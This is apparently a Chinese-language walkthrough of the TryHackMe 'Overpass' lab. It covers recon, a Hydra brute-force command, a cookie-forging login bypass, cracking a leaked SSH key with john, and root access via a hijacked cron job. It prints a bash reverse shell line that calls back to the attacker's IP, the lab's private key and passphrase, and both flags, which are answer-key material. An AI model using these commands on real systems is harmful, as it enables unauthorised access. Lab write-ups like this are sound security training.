# Overpass Writeup
> URL : https://tryhackme.com/room/overpass
IP : 10.10.214.180

## Scan
-  首先是老梗的用 Nmap 掃一下
	- `nmap -A 10.10.214.180`
	- ![](https://i.imgur.com/ZlQoGXj.png)
	- 發現基本上只有開 ssh 跟 http
- 接下來用 dirsearch 掃一下路徑
	- `python3 dirsearch.py -u http://10.10.214.180/ -e all`
	- 看起來基本上比較有趣的只有 `/admin/`
- admin 介面
	- 基本上就是一個滿普通的登入介面，可以輸入帳號或密碼
		- 對著登入介面做了一些盲測的 SQLi
			- `'or'1'='1 --`
			- 之類的都沒有反應
## ROT47 (多走的彎路QQ)
- ![](https://i.imgur.com/CgeDRFe.png)
	- - 選到 About 看了一下，簡介是說他們曾經因為密碼在 rockyou 裡面，所以感到很失望，創了一個密碼管理軟體
- 到 Downloads 來看一下他們的密碼軟體
	- 他們有 source code
	- http://10.10.129.94/downloads/src/overpass.go
	- 擷取重點發現
		- ```go
			//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
			func rot47(input string) string {
				var result []string
				for i := range input[:len(input)] {
					j := int(input[i])
					if (j >= 33) && (j <= 126) {
						result = append(result, string(rune(33+((j+14)%94))))
					} else {
						result = append(result, string(input[i]))
					}
				}
				return strings.Join(result, "")
		  ```
		- 是一個用 Go 語言寫的密碼管理軟體，而他們的加密使用了 ROT47 的加密算法
- 簡單調查了一下 ROT47 的算法
	- ```python
	  def rot47(s):
		x = []
		for i in range(len(s)):
			j = ord(s[i])
			if j >= 33 and j <= 126:
				x.append(chr(33 + ((j + 14) % 94)))
			else:
				x.append(s[i])
		return ''.join(x)
	  ```
	- ![](https://i.imgur.com/sdAFxNT.png)
	- 可以發現 ROT47  也算一種凱薩加密，該加密函數為其自己的反函數，將密文再加密一次就等於解密，與 ROT47 類似。
	- 資料來源 : https://rot47.net/

- 在 about 的部分有出現各開發者的名單
	- `Ninja`
	- `Pars`
	- `Szymex`
	- `Bee`
	- `MuirlandOracle`

- 我心裡的猜想
	- 它們之前的密碼是用 rockyou 的密碼，現在在推他們自己的密碼管理軟體，使用 ROT47 
	- 該不會......可以爆破 web 介面密碼，使用 ROT47 後的 rockyou 吧?
	- 所以寫了以下的 Code 來把 rockyou 轉 ROT47
```python
def rot47(s):
    x = []
    for i in range(len(s)):
        j = ord(s[i])
        if j >= 33 and j <= 126:
            x.append(chr(33 + ((j + 14) % 94)))
        else:
            x.append(s[i])
    return ''.join(x)

with open("/opt/rockyou.txt",'r',errors='ignore') as f:
    rockyou = f.read().split('\n')

rot47_rock = [rot47(i) for i in rockyou]

o = '\n'.join(rot47_rock)

with open('rot47rock.txt','w') as f:
    f.write(o)
```
- 結果 VM 的 Ram 2G 跑不動QQ，害我重開機加大 RAM
- 嘗試進行登入
	- 發現會對 `/api/login` 發一個 http post
		- ![](https://i.imgur.com/CBYHmAK.png)
	- 所以就把所有的使用者準備成一個 txt (每個人名換一行)
	- 使用 Hydra 進行爆破
		-  `hydra -L user_l.txt -P rot47rock.txt 10.10.214.180 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect credentials"`
	-  跑ㄌ很久也沒用沒用QQ

## 觀察登入程式碼
- 爆破畢竟是下下策，還是先觀察一下登入介面的原始碼有什麼東東
- 就發現了一個 login.js
	- http://10.10.214.180/login.js
	- 擷取重要的弱點
		- ```javascript
			if (statusOrCookie === "Incorrect credentials") {
				loginStatus.textContent = "Incorrect Credentials"
				passwordBox.value=""
			} else {
				Cookies.set("SessionToken",statusOrCookie)
				window.location = "/admin"
			}
		  ```
		- 跑到 elase 代表登入成功，會寫入一個餅乾
		 	- 餅乾名稱 : "SessionToken"
		 	- 餅乾值 : statusOrCookie
- 直接用 Firefox 新增一個餅乾
	- 名稱用  "SessionToken"， Value 亂寫
	- 然後就登進去了!!!
	- ![](https://i.imgur.com/BhLN5NG.png)
- 上面直接留了一串 Private Key，也寫說是給 james 的
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```
- 那我們當然就把這一串存到自己的電腦，再嘗試 run 看看囉!!
	- `chmod 600 James_key.pem`
	- `ssh james@10.10.214.180 -i James_key.pem`
	- ![](https://i.imgur.com/8lp75sM.png)
	- 發現 key 需要用密碼!
- 爆密碼
	- 老梗，請約翰出場，先找 `ssh2john` 把 key 轉 `john` 的格式
		- `python3 ../ssh2john.py James_key.pem > James_john.txt`
	- 再來就 run john 囉!
	- `john James_john.txt --wordlist=/opt/rockyou.txt`
		- 密碼就出來囉!!
		- ![](https://i.imgur.com/ohLWuxD.png)
		- `james13`
		- (其實我先跑了 rot47 的密碼，但失敗了QQ)
- 使用 ssh 進行登入
	- `ssh james@10.10.214.180 -i James_key.pem`
	- 搭配密碼 `james13`
	- 成功登入!
	- ![](https://i.imgur.com/LciR33S.png)
	- 取得 `user.txt`
		- `thm{65c1aaf000506e56996822c6281e6bf7}`

## 提權
- 之前我們都用 `Linenum`，這次來換換口味，使用小豌豆 `Linpeas` 吧!
	- 先把檔案 scp 上去
	- `scp -i James_key.pem ../linpeas.sh  james@10.10.214.180:/home/james`

- 馬上就噴出了一個很重要的 Cron job
	- 小豌豆好棒棒!!!
	- ![](https://i.imgur.com/AdxffbY.png)
	- 每分鐘會用 root 權限 `curl` 一次 `overpass.thm` 的網址，然後把值丟去bash

- 發現 `/etc/hosts` 沒有設權限
	- 所以我們可以把 `overpass.thm` 轉到自己的伺服器上
	- ![](https://i.imgur.com/IBeuwFc.png)

- 在自己的電腦上準備一個資料夾路徑
	- `downloads/src/buildscript.sh` 的檔案
	- 內容物為自己的 Reverse shell
		- `bash -c 'bash -i >& /dev/tcp/10.14.7.198/7877 0>&1'`
	- 然後在自己的電腦上開一下 `nc` 進行監聽
		- `nc -vlk 7877`
		- ![](https://i.imgur.com/Lom2bma.png)
	- 開啟 Python server
		- `python3 -m http.server`
- 攻擊戳回來了!!!
	- ![](https://i.imgur.com/0YbxxeO.png)
	- ![](https://i.imgur.com/Yow9Uze.png)
- 取得 root flag
	- ![](https://i.imgur.com/H4HLJ1V.png)
	- `thm{7f336f8c359dbac18d54fdd64ea753bb}`


